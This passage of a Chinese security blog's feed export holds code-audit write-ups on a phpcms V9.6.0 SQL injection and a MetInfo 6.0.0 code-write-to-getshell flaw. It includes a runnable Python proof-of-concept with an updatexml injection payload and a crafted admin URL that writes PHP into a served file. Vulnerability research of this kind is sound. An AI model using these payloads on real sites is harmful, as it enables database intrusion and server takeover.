class="keyword">as</span> $k=&gt;$v) &#123;</span><br><span class="line">setcookie($var.<span class="string">'['</span>.$k.<span class="string">']'</span>, sys_auth($v, <span class="string">'ENCODE'</span>), $time, pc_base::load_config(<span class="string">'system'</span>,<span class="string">'cookie_path'</span>), pc_base::load_config(<span class="string">'system'</span>,<span class="string">'cookie_domain'</span>), $s);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">setcookie($var, sys_auth($value, <span class="string">'ENCODE'</span>), $time, pc_base::load_config(<span class="string">'system'</span>,<span class="string">'cookie_path'</span>), pc_base::load_config(<span class="string">'system'</span>,<span class="string">'cookie_domain'</span>), $s);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看到，对传入的value 进行一次sys_auth 然后setcookie，可以在返回包中拿到回显</p><p>最后还需要存在一个cookie，让我们不被跳转到main界面<br>/Applications/MxSrvs/www/phpcms_V9.6.0/install_package/phpcms/modules/wap/index.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;db = pc_base::load_model(<span class="string">'content_model'</span>);</span><br><span class="line"><span class="keyword">$this</span>-&gt;siteid = <span class="keyword">isset</span>($_GET[<span class="string">'siteid'</span>]) &amp;&amp; (intval($_GET[<span class="string">'siteid'</span>]) &gt; <span class="number">0</span>) ? intval(trim($_GET[<span class="string">'siteid'</span>])) : (param::get_cookie(<span class="string">'siteid'</span>) ? param::get_cookie(<span class="string">'siteid'</span>) : <span class="number">1</span>);</span><br><span class="line">param::set_cookie(<span class="string">'siteid'</span>,<span class="keyword">$this</span>-&gt;siteid);</span><br></pre></td></tr></table></figure></p><p>通过GET方法得到$siteid，然后传到了set_cookie()函数中，满足条件。</p><p><strong>攻击链：</strong></p><ol><li>访问 /index.php?m=wap&amp;a=index&amp;siteid=1 。获取响应头的set-Cookie字段。</li><li>将前一步获取到的字段赋值给userid_flash，作为POST参数。访问 /index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=【payload】</li><li>获取返回头的set—Cookie字段，此即为加密后的payload</li><li>访问 /index.php?m=content&amp;c=down&amp;a_k=【加密后的payload】，注入成功。</li></ol><h2 id="0x02-Poc"><a href="#0x02-Poc" class="headerlink" title="0x02 Poc"></a>0x02 Poc</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2018-12-20 23:24</span></span><br><span class="line"><span class="comment"># @Author  : Patrilic</span></span><br><span class="line"><span class="comment"># @FileName: sql_poc.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        step1 = url + <span class="string">"/index.php?m=wap&amp;c=index&amp;a=init&amp;siteid=1"</span></span><br><span class="line">        response = requests.get(step1)</span><br><span class="line">        post = &#123;</span><br><span class="line">            <span class="string">"userid_flash"</span>:response.cookies[<span class="string">"okuga_siteid"</span>]</span><br><span class="line">        &#125;</span><br><span class="line">        print(<span class="string">"[+] Get Cookie : "</span> + response.cookies[<span class="string">"okuga_siteid"</span>])</span><br><span class="line">        <span class="comment"># 获取cookie，避免登陆失效</span></span><br><span class="line"></span><br><span class="line">        step2 = url + <span class="string">"//index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26f%3Dhaha%26modelid%3D2%26catid%3D7%26"</span></span><br><span class="line">        response = requests.post(step2, post)</span><br><span class="line">        <span class="comment"># print(response.cookies)</span></span><br><span class="line">        sqli_payload = response.cookies[<span class="string">'okuga_att_json'</span>]</span><br><span class="line">        print(<span class="string">"[+] Get Sqli_poc : "</span> + sqli_payload)</span><br><span class="line">        <span class="comment"># 获取加密 payload</span></span><br><span class="line"></span><br><span class="line">        step3 = url + <span class="string">'/index.php?m=content&amp;c=down&amp;a_k='</span> + sqli_payload</span><br><span class="line">        response = requests.get(step3)</span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line">        user = re.findall(<span class="string">r'&lt;/b&gt;XPATH syntax error:(.*?)&lt;br /&gt;'</span>, response.text)</span><br><span class="line">        <span class="comment"># 注入</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            user[<span class="number">0</span>]</span><br><span class="line">            print(<span class="string">"[+] Congraduations! This url is Vulnerable! "</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">"[-] Not vulnerable!"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">     url = sys.argv[<span class="number">1</span>]</span><br><span class="line">     poc(url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-漏洞分析&quot;&gt;&lt;a href=&quot;#0x01-漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞分析&quot;&gt;&lt;/a&gt;0x01 漏洞分析&lt;/h2&gt;&lt;p&gt;漏洞发生在 &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;/Applications/M
      
    
    </summary>
    
    
      <category term="代码审计" scheme="http://patrilic.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Metinfo 6.0.0 任意代码写入导致getshell</title>
    <link href="http://patrilic.top/2019/04/03/Metinfo%206.0.0%20%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E5%86%99%E5%85%A5/"/>
    <id>http://patrilic.top/2019/04/03/Metinfo 6.0.0 任意代码写入/</id>
    <published>2019-04-03T02:58:32.000Z</published>
    <updated>2019-07-13T03:01:20.760Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h2><p>漏洞关键点<br>位于/Applications/MxSrvs/www/MetInfo6.0.0/admin/include/global.func.php中约878行的Copyindx函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Copyindx</span><span class="params">($newindx,$type)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!file_exists($newindx))&#123;</span><br><span class="line">$oldcont =<span class="string">"&lt;?php\n# MetInfo Enterprise Content Management System \n# Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. \n\$filpy = basename(dirname(__FILE__));\n\$fmodule=$type;\nrequire_once '../include/module.php'; \nrequire_once \$module; \n# This program is an open source system, commercial use, please consciously to purchase commercial license.\n# Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.\n?&gt;"</span>;</span><br><span class="line">$fp = fopen($newindx,w);</span><br><span class="line">fputs($fp, $oldcont);</span><br><span class="line">fclose($fp);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>$type可控，并且直接带入到php代码中，前提是不存在 $newindx 变量，往上跟函数</p><p>位于/Applications/MxSrvs/www/MetInfo6.0.0/admin/column/global.func.php的124行调用该函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Copyindx(ROOTPATH.$foldername.<span class="string">'/index.php'</span>,$module);</span><br></pre></td></tr></table></figure></p><p>规定 $newindx 为目录名 + /index.php, 然后 $module 该文件  </p><p>再往上跟，找到/Applications/MxSrvs/www/MetInfo6.0.0/admin/column/save.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($if_in==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>($filename!=<span class="string">''</span> &amp;&amp; $filename!=$filenameold)&#123;</span><br><span class="line">$filenameok = $db-&gt;get_one(<span class="string">"SELECT * FROM &#123;$met_column&#125; WHERE filename='&#123;$filename&#125;' and foldername='$foldername' and id!='$id'"</span>);</span><br><span class="line"><span class="keyword">if</span>($filenameok)metsave(<span class="string">'-1'</span>,$lang_modFilenameok);</span><br><span class="line"><span class="keyword">if</span>(is_numeric($filename) &amp;&amp; $filename!=$id &amp;&amp; $met_pseudo)&#123;</span><br><span class="line">$filenameok1 = $db-&gt;get_one(<span class="string">"SELECT * FROM &#123;$met_column&#125; WHERE id='&#123;$filename&#125;' and foldername='$foldername'"</span>);</span><br><span class="line"><span class="keyword">if</span>($filenameok1)metsave(<span class="string">'-1'</span>,$lang_jsx30);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$filedir=<span class="string">"../../"</span>.$foldername;</span><br><span class="line"><span class="keyword">if</span>(!file_exists($filedir))@mkdir($filedir,<span class="number">0777</span>);</span><br><span class="line"><span class="keyword">if</span>(!file_exists($filedir))metsave(<span class="string">'-1'</span>,$lang_modFiledir);</span><br><span class="line">column_copyconfig($foldername,$module,$id);</span><br></pre></td></tr></table></figure><p>满足该条件即可调用colnmn_copyconfig()函数</p><p><strong>攻击流程</strong> </p><ol><li>登陆后台</li><li>构造payload：admin/column/save.php?name=123&amp;action=editor&amp;foldername=upload&amp;module=22;phpinfo();/*</li><li>访问/upload/index.php</li></ol><p>注意：</p><ol><li>foldername可控，如果upload目录下存在index.php，不会重复写入，更换目录即可</li><li>/* 必须要求，会注释掉后面的require_once ‘../include/module.php’; 防止跳转到404页面</li></ol><h2 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h2><p><img src="/Metinfo 6.0.0 任意代码写入.resources/848F9960-F75C-46E1-9661-C20F9BA586A0.png" alt="3e67b9c86d5847910d672ea170c376e5"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-漏洞分析&quot;&gt;&lt;a href=&quot;#0x01-漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞分析&quot;&gt;&lt;/a&gt;0x01 漏洞分析&lt;/h2&gt;&lt;p&gt;漏洞关键点&lt;br&gt;位于/Applications/MxSrvs/www/MetInf
      
    
    </summary>
    
    
      <category term="代码审计" scheme="http://patrilic.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
</feed>
